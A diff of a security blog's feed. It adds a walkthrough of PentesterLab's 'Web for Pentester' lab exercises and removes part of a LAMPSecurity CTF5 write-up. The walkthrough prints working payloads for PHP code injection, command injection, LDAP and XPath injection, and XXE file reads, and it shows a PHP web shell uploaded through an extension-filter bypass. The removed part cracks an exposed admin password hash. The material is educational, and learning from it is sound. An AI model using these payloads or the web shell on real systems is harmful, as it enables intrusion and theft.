+
+<p><code>plain
+Parse error: syntax error, unexpected ',' in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/codeexec/example2.php on line 22
+</code></p>
+
+<p>So the code picks up after the curly bracket, we know we have to comment out the rest. And between the curly bracket and the comment characters we can put our code:</p>
+
+<p><code>plain
+function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');}echo 'INJECTION SUCCESSFUL';//,$b-&gt;'.$order.');}
+</code></p>
+
+<p>And the result:</p>
+
+<p><img class="center" src="/images/pentest/webpentester/codeinj2.png" title="&lsquo;code injection 2&rsquo; &lsquo;code injection&rsquo;" ></p>
+
+<p>eval() now sees a strcmp, which is executed (but only with 1 parameter, hence the warning). Then eval goes further, sees our code and executes it (the warning doesn&rsquo;t stop the execution). And finally, eval reaches the leftovers, which have been commented out, so it does nothing.</p>
+
+<p>This here was my favorite part in all the challenge!</p>
+
+<p><strong>Example 3</strong></p>
+
+<p>Here we have the familiar hello hacker message, but with a twist on the URL: <a href="http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer</a></p>
+
+<p>Let&rsquo;s see the code:</p>
+
+<p>``` php
+&lt;?php</p>
+
+<pre><code>echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
+</code></pre>
+
+<p>?>
+```</p>
+
+<p>Ok, preg_replace searches inside the base parameter (Hello lamer) for matches to the pattern parameter (hacker) and replaces them with what&rsquo;s in the new parameter (hacker).</p>
+
+<p>The problem with preg_replace is that it can be passed the modifier <a href="https://secure.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">e (PREG_REPLACE_EVAL)</a> that causes PHP to <a href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">execute the replacement value</a>.</p>
+
+<p>To exploit this, first we have to add the modifier to the pattern: <code>pattern=/lamer/e</code>. Then we put our code inside the new parameter: <code>new=phpinfo()</code>. The URL now looks like this: <a href="http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer</a></p>
+
+<p><img class="center" src="/images/pentest/webpentester/phpinfo.png" title="&lsquo;phpinfo&rsquo; &lsquo;phpinfo output&rsquo;" ></p>
+
+<p><strong>Example 4</strong></p>
+
+<p>This one looks like the first example, but with a new addition in the code:</p>
+
+<p><code>php
+// ensure name is not empty
+assert(trim("'".$_GET['name']."'"));
+echo "Hello ".htmlentities($_GET['name']);
+</code></p>
+
+<p><a href="https://secure.php.net/manual/ro/function.assert.php">assert</a> checks if the assertions is false, but the most important thing that we need to know is: <strong>if the assertion is given as a string it will be evaluated as PHP code by assert()</strong>.</p>
+
+<p>The assert returns true, because it checks that the name parameter = &lsquo;hacker&rsquo;, which it is. When injecting a single quote, we see this error:</p>
+
+<p><code>plain
+Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /var/www/codeexec/example4.php(4) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/codeexec/example4.php on line 4
+</code></p>
+
+<p>I used a PHP sandbox to help me with this. Let&rsquo;s imagine that the name parameter is a simple string with the value of hacker:</p>
+
+<p><code>php
+$name = 'hacker';
+</code></p>
+
+<p>Thanks to the use of trim, assert will see (and try to evaluate) the value of &lsquo;hacker&rsquo;. Knowing this, if I try injecting <code>hacker'.phpinfo().&lsquo;</code>, inside the code I assume it will look like this:</p>
+
+<p><code>php
+$name = 'hacker'.phpinfo().'';
+</code></p>
+
+<p>With the string concatenation, phpinfo() is displayed, but we also see at the bottom of the page: <code>Hello hacker'.phpinfo().&lsquo;</code>. The assert was successful, and the code was executed.</p>
+
+<h3>Commands injection</h3>
+
+<p><strong>Example 1</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/cmd1.png" title="&lsquo;cmd injection&rsquo; &lsquo;ping&rsquo;" ></p>
+
+<p>It looks like a ping program:</p>
+
+<p><code>php
+&lt;?php
+  system("ping -c 2 ".$_GET['ip']);
+?&gt;
+</code></p>
+
+<p>You can chain another command after the ping one by doing this: <code>ip=127.0.0.1;whoami</code>. Below the ping output, you can now see the whoami output, which in this case is www-data</p>
+
+<p><strong>Example 2</strong></p>
+
+<p>This looks the same like the previous one, but let&rsquo;s see the code:</p>
+
+<p>``` php
+&lt;?php
+  if (!(preg_match(&lsquo;/^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}$/m&rsquo;, $_GET[&lsquo;ip&rsquo;]))) {</p>
+
+<pre><code> die("Invalid IP address");
+</code></pre>
+
+<p>  }
+  system(&ldquo;ping -c 2 &rdquo;.$_GET[&lsquo;ip&rsquo;]);
+?>
+```</p>
+
+<p>There is some regex added now to validate that the ip parameter will indeed look like in IP. However, similar to a previous example, the check won&rsquo;t look on further lines. We can use <code>%0a</code> to introduce a new line, and run our command there: <code>ip=127.0.0.1%0Apwd</code>. And the output is:</p>
+
+<p>``` plain
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.012 ms
+64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms</p>
+
+<p>&mdash;&ndash; 127.0.0.1 ping statistics &mdash;&ndash;
+2 packets transmitted, 2 received, 0% packet loss, time 999ms
+rtt min/avg/max/mdev = 0.012/0.017/0.022/0.005 ms
+/var/www/commandexec
+```</p>
+
+<p><strong>Example 3</strong></p>
+
+<p>Same-looking URL, and slightly different code:</p>
+
+<p>``` php
+&lt;?php
+  if (!(preg_match(&lsquo;/^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}$/&rsquo;, $_GET[&lsquo;ip&rsquo;]))) {</p>
+
+<pre><code> header("Location: example3.php?ip=127.0.0.1");
+</code></pre>
+
+<p>  }
+  system(&ldquo;ping -c 2 &rdquo;.$_GET[&lsquo;ip&rsquo;]);
+?>
+```</p>
+
+<p>This time, the script will redirect the user if the ip parameter doesn&rsquo;t match the regex. However, the execution will continue, even if the browser gets redirected. To stop the execution altogether, it would be necessary to call the <em>die()</em> function after the <em>header()</em> function, which isn&rsquo;t happening in this case. So we can still inject a command, but we&rsquo;ll need to do it through another medium than the browser, or use a proxy. For this, I used Burp, sent the payload <code>ip=127.0.0.1;ls</code>, and looked inside the 302 response to find what I wanted to see:</p>
+
+<p><code>plain
+example1.php
+example2.php
+example3.php
+index.html
+</code></p>
+
+<h3>LDAP attacks</h3>
+
+<p><strong>Example 1</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/ldap1.png" title="&lsquo;ldap&rsquo; &lsquo;ldap 1&rsquo;" ></p>
+
+<p>This is a new type of exercise, involving LDAP:</p>
+
+<p>``` php
+&lt;?php
+  require &ldquo;../header.php&rdquo; ;
+  $ld = ldap_connect(&ldquo;localhost&rdquo;) or die(&ldquo;Could not connect to LDAP server&rdquo;);
+  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
+  ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
+  if ($ld) {
+   if (isset($_GET[&ldquo;username&rdquo;])) {</p>
+
+<pre><code> $user = "uid=".$_GET["username"]."ou=people,dc=pentesterlab,dc=com";
+</code></pre>
+
+<p>   }
+   $lb = @ldap_bind($ld, $user,$_GET[&ldquo;password&rdquo;]);</p>
+
+<pre><code>if ($lb) {
+   echo "AUTHENTICATED";
+}
+else {
+   echo "NOT AUTHENTICATED";
+}
+</code></pre>
+
+<p>  }
+  require &ldquo;../footer.php&rdquo; ;
+?>
+```</p>
+
+<p>First, let&rsquo;s learn more about <a href="http://projects.webappsec.org/w/page/13246947/LDAP%20Injection">LDAP</a>:</p>
+
+<blockquote><p>LDAP Injection is an attack technique used to exploit web sites that construct LDAP statements from user-
+supplied input.</p>
+
+<p>Lightweight Directory Access Protocol (LDAP) is an open-standard protocol for both querying and
+manipulating X.500 directory services. The LDAP protocol runs over Internet transport protocols, such as
+TCP. Web applications may use user-supplied input to create custom LDAP statements for dynamic web page
+requests.</p>
+
+<p>When a web application fails to properly sanitize user-supplied input, it is possible for an attacker to
+alter the construction of an LDAP statement. When an attacker is able to modify an LDAP statement, the
+process will run with the same permissions as the component that executed the command. (e.g. Database
+server, Web application server, Web server, etc.). This can cause serious security problems where the
+permissions grant the rights to query, modify or remove anything inside the LDAP tree. The same advanced
+exploitation techniques available in SQL Injection can also be similarly applied in LDAP Injection.</p></blockquote>
+
+<p>This particular example is vulnerable to <a href="https://securitysynapse.blogspot.com/2013/09/dangers-of-ldap-null-base-and-bind.html">NULL bind</a>, where an anonymous user can access information from the LDAP directory without authentication. For this, the values sent to the server have to be null, so instead of just sending empty values, we have to completely remove them:</p>
+
+<p><img class="center" src="/images/pentest/webpentester/ldap1_sol.png" title="&lsquo;ldap 1&rsquo; &lsquo;ldap null&rsquo;" ></p>
+
+<p><strong>Example 2</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/ldap2.png" title="&lsquo;ldap&rsquo; &lsquo;ldap 2&rsquo;" ></p>
+
+<p>Let&rsquo;s see the code:</p>
+
+<p>``` php
+&lt;?php
+  require &ldquo;../header.php&rdquo; ;
+  $ld = ldap_connect(&ldquo;localhost&rdquo;) or die(&ldquo;Could not connect to LDAP server&rdquo;);
+  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
+  ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
+  if ($ld) {
+   $lb = @ldap_bind($ld, &ldquo;cn=admin,dc=pentesterlab,dc=com&rdquo;, &ldquo;pentesterlab&rdquo;);</p>
+
+<pre><code>if ($lb) {
+  $pass = "{MD5}".base64_encode(pack("H*",md5($_GET['password'])));
+  $filter = "(&amp;(cn=".$_GET['name'].")(userPassword=".$pass."))";
+  if (!($search=@ldap_search($ld, "ou=people,dc=pentesterlab,dc=com", $filter))) {
+  echo("Unable to search ldap server&lt;br&gt;");
+  echo("msg:'".ldap_error($ld)."'&lt;/br&gt;");
+} else {
+  $number_returned = ldap_count_entries($ld,$search);
+  $info = ldap_get_entries($ld, $search);
+  if ($info["count"] &lt; 1) {
+     //NOK 
+     echo "UNAUTHENTICATED";
+  }
+  else {
+    echo "AUTHENTICATED as";
+    echo(" ".htmlentities($info[0]['uid'][0]));
+  } 
+}
+</code></pre>
+
+<p>   }
+  }
+  require &ldquo;../footer.php&rdquo; ;
+?>
+```</p>
+
+<p>The goal here is to be able to authenticate with any password, and get information from the directory. Now, since the password is being hashed, the only likely place to inject into is the username. To learn more about LDAP, its rules and types of injection, I found a nice <a href="https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf">BlackHat whitepaper</a>. The key takeaway is that the injection will happen in the filter. In our case, the filter is:</p>
+
+<p><code>plain
+(&amp;(cn=name)(userPassword=password))
+</code></p>
+
+<p>We see here that filter uses <strong>&amp;</strong>, which specifies an AND condition, where both username and password have to be true. Remembering that we can only inject inside the username parameter, here&rsquo;s what we can do:</p>
+
+<p><code>plain
+(&amp;(cn=name)(cn=*))%00(userPassword=password))
+</code></p>
+
+<p>The ) closes the name filter, then we introduce an always true condition with the * wildcard, the closing ) matches the  one at the beginning of the filter, and the null byte..well, nullifies the rest of the filter.</p>
+
+<p><img class="center" src="/images/pentest/webpentester/ldap2_sol.png" title="&lsquo;ldap 2&rsquo; &lsquo;ldap filter injection&rsquo;" ></p>
+
+<h3>File Upload</h3>
+
+<p><strong>Example 1</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/upload1.png" title="&lsquo;upload1&rsquo; &lsquo;file upload&rsquo;" ></p>
+
+<p>It looks like we can upload an image and find it in the <code>/upload/images/</code> directory:</p>
+
+<p>``` php
+&lt;?php
+if(isset($<em>FILES[&lsquo;image&rsquo;]))
+{
+  $dir = &lsquo;/var/www/upload/images/&rsquo;;
+  $file = basename($</em>FILES[&lsquo;image&rsquo;][&lsquo;name&rsquo;]);
+  if(move_uploaded_file($_FILES[&lsquo;image&rsquo;][&lsquo;tmp_name&rsquo;], $dir. $file))
+  {
+  echo &ldquo;Upload done&rdquo;;
+  echo &ldquo;Your file can be found <a href=\"/upload/images/".htmlentities($file)."\">here</a>&rdquo;;
+  }
+  else
+  {</p>
+
+<pre><code>echo 'Upload failed';
+</code></pre>
+
+<p>  }
+}
+?>
+```</p>
+
+<p>Obviously, I am thinking about uploading a PHP shell instead. But first, I wanted to see if there is anything already in the images folder, and I wasn&rsquo;t disappointed:</p>
+
+<p><img class="center" src="/images/pentest/webpentester/hacker.png" title="&lsquo;lol&rsquo; &lsquo;haxxor chat&rsquo;" ></p>
+
+<p>Ok, now it&rsquo;s time for the shell. I created a basic PHP shell:</p>
+
+<p><code>php
+&lt;?php
+  system($_GET["cmd"]);
+?&gt;
+</code></p>
+
+<p>Uploaded it, navigated to it and passed a command:</p>
+
+<p><code>plain
+http://192.168.217.138/upload/images/ashell.php?cmd=pwd
+/var/www/upload/images
+</code></p>
+
+<p><strong>Example 2</strong></p>
+
+<p>Same functionality, but this time the script doesn&rsquo;t allow PHP extensions:</p>
+
+<p>``` php
+&lt;?php
+if(isset($<em>FILES[&lsquo;image&rsquo;]))
+{
+  $dir = &lsquo;/var/www/upload/images/&rsquo;;
+  $file = basename($</em>FILES[&lsquo;image&rsquo;][&lsquo;name&rsquo;]);</p>
+
+<pre><code>if (preg_match('/\.php$/',$file)) {
+    DIE("NO PHP");
+}
+</code></pre>
+
+<p>  if(move_uploaded_file($_FILES[&lsquo;image&rsquo;][&lsquo;tmp_name&rsquo;], $dir . $file))
+  {
+  echo &lsquo;Upload done !&rsquo;;
+  echo &lsquo;Your file can be found <a href="http://chousensha.github.io/upload/images/'.htmlentities($file).'">here</a>&rsquo;;
+  }
+  else
+  {</p>
+
+<pre><code>echo 'Upload failed';
+</code></pre>
+
+<p>  }
+}
+?>
+```</p>
+
+<p>The code checks that an extension may not end in php. Uploading a .php file followed by a non-existent extension will cause the server to ignore the unknown extension and switch to the next one it knows. I uploaded the same shell as <code>ashell.php.fail</code>:</p>
+
+<p><code>plain
+http://192.168.217.138/upload/images/ashell.php.fail?cmd=ls%20/home
+user
+</code></p>
+
+<h3>XML attacks</h3>
+
+<p><strong>Example 1</strong></p>
+
+<p><img class="center" src="/images/pentest/webpentester/xml1.png" title="&lsquo;xml1&rsquo; &lsquo;xml 1&rsquo;" ></p>
+
+<p>A twist on the previous challenges, this time with the use of XML:</p>
+
+<p><code>php
+Hello  
+&lt;?php
+  $xml=simplexml_load_string($_GET['xml']);
+  print_r((string)$xml);
+?&gt;
+</code></p>
+
+<p>This particular vulnerability revolves around <a href="https://phpsecurity.readthedocs.io/en/latest/Injection-Attacks.html#xml-injection">XML injection</a>:</p>
+
+<blockquote><p>Custom entities can be defined by including them directly in an optional DOCTYPE and the expanded
+value they represent may reference an external resource to be included. It is this capacity of
+ordinary XML to carry custom references which can be expanded with the contents of an external
+resources that gives rise to an XXE vulnerability.</p></blockquote>
+
+<p>So, I defined the following entity:</p>
+
+<p><code>plain
+&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;
+</code></p>
+
+<p>This entity can be referenced with <code>&hacker;</code>. Of course, we will need to URL encode it. Here&rsquo;s the URL with the XML injection:</p>
+
+<p><code>plain
+192.168.217.138/xml/example1.php?xml=&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;&lt;test&gt;%26hacker%3B&lt;/test&gt;
+</code></p>
+
+<p><img class="center" src="/images/pentest/webpentester/xml1_inj.png" title="&lsquo;xml1&rsquo; &lsquo;xml injection&rsquo;" ></p>
+
+<p><strong>Example 2</strong></p>
+
+<p>Another hello page, but the URL is a bit different: <a href="http://192.168.217.138/xml/example2.php?name=hacker">http://192.168.217.138/xml/example2.php?name=hacker</a></p>
+
+<p>``` php
+  $x = &ldquo;<data><users><user><name>hacker</name><message>Hello hacker</message><password>pentesterlab</password></user><user><name>admin</name><message>Hello admin</message><password>s3cr3tP4ssw0rd</password></user></users></data>&rdquo;;</p>
+
+<p>  $xml=simplexml_load_string($x);
+  $xpath = &ldquo;users/user/name[.=&lsquo;&rdquo;.$_GET['name&rsquo;].&ldquo;&lsquo;]/parent::*/message&rdquo;;
+  $res = ($xml->xpath($xpath));
+  while(list( ,$node) = each($res)) {</p>
+
+<pre><code>echo $node;
+</code></pre>
+
+<p>  }
+```</p>
+
+<p>We see here some XML data containing users and passwords, and user input being used to construct an <a href="https://www.w3schools.com/xml/xml_xpath.asp">XPATH</a> query. XPATH is used to navigate through elements and attributes in an XML document.</p>
+
+<p>With a name of hacker, the XPATH would look like this:</p>
+
+<p><code>plain
+users/user/name[.='hacker']/parent::*/message
+</code></p>
+
+<p><a href="https://www.owasp.org/index.php/XPATH_Injection">XPATH injection</a> is similar to SQL injection. Here we can inject inside the name input to create an always true condition and get rid of the remaining query as follows: <code>hacker' or 1=1]%00</code>. Now the query looks like this:</p>
+
+<p><code>plain
+users/user/name[.='hacker' or 1=1]%00']/parent::*/message
+</code></p>
+
+<p><img class="center" src="/images/pentest/webpentester/xml2.png" title="&lsquo;xml2&rsquo; &lsquo;xpath injection&rsquo;" ></p>
+
+<p>Wow, this was a really fun challenge, and I hadn&rsquo;t done a web app challenge in a while! Many thanks to PentesterLab for this challenge and their help when I had questions! They also have their own course for the challenge <a href="https://pentesterlab.com/exercises/web_for_pentester/course">here</a></p>
+
+<p>Until next time, straight from the cow&rsquo;s mouth:</p>
+
+<p>``` plain
+/ You are fighting for survival in your \
+\ own sweet and gentle way.             /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest lab - NullByte]]></title>
@@ -223,8 +1492,8 @@ Database: seth
 <p>I went back to that unconventional SSH port and tried to log in as ramses with the password: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE . When that didn&rsquo;t work, I fed it to Google and the first MD5 decoder that popped decrypted it as <code>omega</code></p>
 
 <p>``` plain
-ssh -p 777 <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x72;&#97;&#x6d;&#115;&#101;&#x73;&#64;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#50;&#x31;&#55;&#46;&#49;&#51;&#x35;">&#114;&#x61;&#109;&#x73;&#x65;&#x73;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x32;&#x31;&#x37;&#46;&#x31;&#51;&#x35;</a>
-<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x72;&#97;&#109;&#115;&#x65;&#x73;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#49;&#55;&#x2e;&#49;&#x33;&#x35;">&#114;&#97;&#x6d;&#x73;&#101;&#x73;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#55;&#46;&#x31;&#x33;&#x35;</a>&rsquo;s password:</p>
+ssh -p 777 <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#x72;&#x61;&#109;&#x73;&#101;&#115;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x32;&#x31;&#x37;&#x2e;&#49;&#x33;&#53;">&#114;&#97;&#109;&#115;&#101;&#115;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#x31;&#55;&#46;&#x31;&#51;&#53;</a>
+<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x72;&#97;&#109;&#115;&#101;&#115;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x32;&#x31;&#55;&#46;&#49;&#51;&#x35;">&#114;&#97;&#x6d;&#115;&#x65;&#x73;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#50;&#49;&#55;&#x2e;&#x31;&#51;&#53;</a>&rsquo;s password:</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
 the exact distribution terms for each program are described in the
@@ -280,8 +1549,8 @@ adf11c7a9e6523e630aaf3b9b7acb51d</p>
 
 <p>It seems that you have pwned the box, congrats.
 Now you done that I wanna talk with you. Write a walk &amp; mail at
-<a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#120;&#108;&#121;&#48;&#110;&#64;&#115;&#x69;&#x67;&#97;&#x69;&#x6e;&#116;&#46;&#111;&#x72;&#103;">&#x78;&#108;&#121;&#x30;&#110;&#x40;&#x73;&#105;&#103;&#x61;&#105;&#x6e;&#116;&#x2e;&#x6f;&#x72;&#x67;</a> attach the walk and proof.txt
-If sigaint.org is down you may mail at <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x6e;&#98;&#115;&#x6c;&#121;&#x30;&#x6e;&#x40;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#110;&#98;&#x73;&#x6c;&#x79;&#48;&#110;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#x63;&#111;&#109;</a></p>
+<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#120;&#108;&#x79;&#48;&#110;&#64;&#115;&#x69;&#103;&#x61;&#x69;&#110;&#x74;&#46;&#111;&#114;&#103;">&#x78;&#108;&#x79;&#48;&#110;&#x40;&#x73;&#105;&#103;&#97;&#x69;&#110;&#116;&#x2e;&#111;&#114;&#103;</a> attach the walk and proof.txt
+If sigaint.org is down you may mail at <a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#x6e;&#x62;&#x73;&#x6c;&#121;&#x30;&#110;&#x40;&#103;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;">&#x6e;&#98;&#x73;&#108;&#121;&#x30;&#x6e;&#x40;&#103;&#x6d;&#x61;&#105;&#108;&#x2e;&#x63;&#111;&#109;</a></p>
 
 <p>USE THIS PGP PUBLIC KEY</p>
 
@@ -925,7 +2194,7 @@ bob> Work a little more your post</p>
 TGglMUxecjJDSDclN1Ej</p>
 
 <p>Mail me your methods at:
-<a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#x61;&#110;&#101;&#x73;&#116;&#x69;&#115;&#64;&#x62;&#101;&#x63;&#104;&#116;&#x73;&#x6f;&#117;&#x64;&#x69;&#x73;&#46;&#99;&#111;&#109;">&#97;&#x6e;&#x65;&#115;&#x74;&#105;&#x73;&#64;&#x62;&#x65;&#x63;&#x68;&#x74;&#115;&#x6f;&#x75;&#100;&#x69;&#115;&#46;&#99;&#111;&#x6d;</a>
+<a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#97;&#110;&#x65;&#x73;&#116;&#105;&#115;&#x40;&#98;&#x65;&#99;&#x68;&#116;&#x73;&#111;&#117;&#100;&#x69;&#115;&#x2e;&#x63;&#x6f;&#x6d;">&#x61;&#110;&#x65;&#x73;&#116;&#105;&#x73;&#64;&#98;&#x65;&#x63;&#x68;&#x74;&#x73;&#x6f;&#x75;&#100;&#105;&#x73;&#x2e;&#x63;&#111;&#x6d;</a>
 ```</p>
 
 <p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>
@@ -1021,225 +2290,6 @@ die;
 <p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>
 
 <p><img class="center" src="/images/pentest/drunkadmin/think.png" title="&lsquo;think&rsquo; &lsquo;hmm&rsquo;" ></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF5]]></title>
-    <link href="http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/"/>
-    <updated>2016-05-05T12:24:38-04:00</updated>
-    <id>http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5</id>
-    <content type="html"><![CDATA[<p>Continuing the LAMPSecurity series, the next machine I&rsquo;m going after is CTF5.</p>
-
-<!-- more -->
-
-
-<h3>Recon</h3>
-
-<p>Nmap scan reveals there are plenty of open ports:</p>
-
-<p>``` plain
-nmap -sS -sV -p1-65535 192.168.80.154</p>
-
-<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-05-09 12:17 EDT
-Nmap scan report for 192.168.80.154
-Host is up, received arp-response (0.00024s latency).
-Not shown: 65524 closed ports
-Reason: 65524 resets
-PORT      STATE SERVICE     REASON         VERSION
-22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7 (protocol 2.0)
-25/tcp    open  smtp        syn-ack ttl 64 Sendmail 8.14.1/8.14.1
-80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.2.6 ((Fedora))
-110/tcp   open  pop3        syn-ack ttl 64 ipop3d 2006k.101
-111/tcp   open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
-139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
-143/tcp   open  imap        syn-ack ttl 64 University of Washington IMAP imapd 2006k.396 (time zone: -0400)
-445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
-901/tcp   open  http        syn-ack ttl 64 Samba SWAT administration server
-3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.0.45
-38972/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
-```</p>
-
-<p>I searched for exploits for the versions of the listed services, but I couldn&rsquo;t find anything usable. So it&rsquo;s back to the web server..</p>
-
-<h4>Web server</h4>
-
-<p>The website provides some potential entry points that we&rsquo;ll have to take a closer look at:</p>
-
-<p><img class="center" src="/images/pentest/ctf5/phake.png" title="&lsquo;phake home&rsquo; &lsquo;phake org&rsquo;" ></p>
-
-<p>We can register for a mailing list:</p>
-
-<p><img class="center" src="/images/pentest/ctf5/list.png" title="&lsquo;mail list&rsquo; &lsquo;mailing list&rsquo;" ></p>
-
-<p>Tampering with the about page URL <code><a href="http://192.168.80.154/?page=about">http://192.168.80.154/?page=about</a></code> gives errors, so LFI might be possible</p>
-
-<p>The blog page also has an admin login page and another Squirrel Mail page:</p>
-
-<p><img class="center" src="/images/pentest/ctf5/blog.png" title="&lsquo;blog&rsquo; &lsquo;blog&rsquo;" ></p>
-
-<p>The contact form allows you to send a message to the staff, and there is another app that acts as an event manager:</p>
-
-<p><img class="center" src="/images/pentest/ctf5/event.png" title="&lsquo;event manager&rsquo; &lsquo;event planner&rsquo;" ></p>
-
-<p>Also, on port 901 there is a Samba SWAT server protected by basic authentication. This server provides a web-based interface for configuring Samba.</p>
-
-<h3>Exploiting the CMS</h3>
-
-<p>I made an account on the event manager, but that doesn&rsquo;t seem to help me much besides creating new blog posts. Next I tested to see if there might be any SQLi in the contact form, but no luck there either. And despite the path traversal error, I wasn&rsquo;t able to navigate to any arbitrary files on the system.</p>
-
-<p>It turns out I had actually overlooked an important information. On Andy Carp&rsquo;s blog, we can see the site is powered by NanoCMS. I noticed it but I didn&rsquo;t give it any thought. When I finally thought to click on it and learn more, it took me to a domain-for-sale page, so I figured it might be some simulated CMS created for this challenge only. Good that I thought to google it and see how wrong I was :p <a href="https://github.com/kalyan02/NanoCMS">NanoCMS</a> is a lightweight CMS based on PHP that is now discontinued. However, I found a super useful <a href="http://www.madirish.net/304">NanoCMS security review</a> that made possible the compromising of the target ;)</p>
-
-<p>Among the vulnerabilities present in the CMS, there is one that allows unrestricted access to the <code>/data/pagesdata.txt</code>. This file contains the username and password hash of the administrator:</p>
-
-<p><code>plain
-a:12:{s:8:"homepage";s:1:"1";s:10:"links_cats";a:4:{s:7:"sidebar";a:2:{i:0;i:1;i:1;i:4;}s:11:"other-pages";a:0:{}s:14:"top-navigation";a:2:{i:0;s:1:"1";i:1;s:1:"4";}s:12:"Footer-Right";a:2:{i:0;s:1:"1";i:1;s:1:"4";}}s:5:"slugs";a:2:{i:1;s:4:"home";i:4;s:7:"contact";}s:6:"titles";a:2:{i:1;s:4:"Home";i:4;s:7:"Contact";}s:10:"slug_count";i:11;s:8:"settings";a:3:{s:19:"index-last-modified";i:1234513760;s:18:"def-template-areas";a:4:{i:0;s:12:"website name";i:2;s:14:"website slogan";i:3;s:16:"below navigation";i:4;s:16:"copyright notice";}s:18:"def-template-links";a:2:{i:0;s:14:"top-navigation";i:1;s:12:"Footer-Right";}}s:13:"active-tweaks";a:2:{i:0;s:7:"deutsch";i:1;s:19:"language-pack-tweak";}s:11:"lang-select";s:7:"english";s:6:"seourl";s:1:"0";s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";s:7:"version";s:4:"v_4f";}
-</code></p>
-
-<p>I cracked the hash with my favorite <a href="https://hashkiller.co.uk/md5-decrypter.aspx">online cracker</a> and found out the password is <em>shannon</em>. Next, I logged in to the admin panel:</p>
-
-<p><img class="center" src="/images/pentest/ctf5/nanocms.png" title="&lsquo;nanocms admin panel&rsquo; &lsquo;admin panel&rsquo;" ></p>
-
